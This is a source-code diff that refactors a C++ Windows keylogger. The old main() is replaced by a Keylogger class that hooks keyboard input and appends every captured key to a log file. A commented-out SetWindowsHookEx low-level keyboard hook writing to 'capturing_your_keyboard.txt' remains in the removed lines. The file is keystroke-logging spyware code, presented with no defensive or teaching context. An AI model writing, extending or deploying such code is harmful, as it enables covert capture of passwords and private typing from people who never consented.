@@ -1,26 +1,21 @@
-// Keylogger.cpp : Defines the entry point for the console application.
-//
-
 #include "stdafx.h"
+#include "Keylogger.h"
 
-#include "Hook.h"
 
-using namespace std;
-
-std::wofstream logFile;
-
-int main() {
-	auto hook = new Hook();
-	hook->SetHook([](int a) -> void { cout << a; });
-	while (GetMessage(NULL, NULL, 0, 0));
-
-	/*Hook = SetWindowsHookEx(WH_KEYBOARD_LL, kbProc, NULL, 0);
-	logFile.open(L"capturing_your_keyboard.txt", std::ios::app);
-
-	while (GetMessage(NULL, NULL, 0, 0));
-
-	logFile.close();*/
-
-	return 0;
+void Keylogger::start() {
+	hook = new Hook();
+	//std::function<void(wchar_t[])> callback = std::bind(&Keylogger::keyboardHandler, this);
+	hook->SetHook([this](wchar_t key[]) {
+		keyboardHandler(key);
+	});
+	logFile.open(FILENAME, std::ios::app);
 }
 
+void Keylogger::keyboardHandler(wchar_t* key) {
+	std::cout << "key\n";
+	logFile << key << std::flush;
+}
+
+void Keylogger::stop() {
+	logFile.close();
+}
